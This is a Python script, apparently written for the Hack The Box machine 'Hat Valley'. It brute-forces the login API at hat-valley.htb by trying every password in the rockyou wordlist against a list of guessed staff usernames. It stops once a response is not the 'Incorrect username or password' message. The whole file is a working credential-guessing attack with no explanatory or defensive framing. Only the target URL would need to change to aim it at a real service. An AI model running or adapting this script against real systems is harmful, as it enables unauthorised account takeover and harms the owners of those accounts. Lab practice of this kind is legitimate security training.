from requests import post
import time

wordlist = "/usr/share/wordlists/rockyou.txt"
usrn = ["bean.hill", "christine.wool", "christopher.jones", "jackson.lightheart","bean", "christine", "christopher", "jackson", "hill", "wool", "jones", "lightheart"]

def ayy(username, password):
        endpoint = "http://hat-valley.htb/api/login"
        payload = {
            "username" : username,
            "password" : password,
        }
        r = post(endpoint, json=payload)
        print("[+] " + r.text)
        return r.text

found = False
with open(wordlist,'r') as mariob:
    for passWL in mariob:
					if found == False:
						for pasw in passWL.split():
							for usernames in usrn:
								print("[+++] testing " + usernames + ":" + pasw)
								if ayy(usernames, pasw) == "Incorrect username or password":
									print("[+] Found?: " + str(found))
									time.sleep(.01)
								else:
									found = True
									print("[+] Found?: " + str(found) + " | password: " + pasw)
					else: exit()
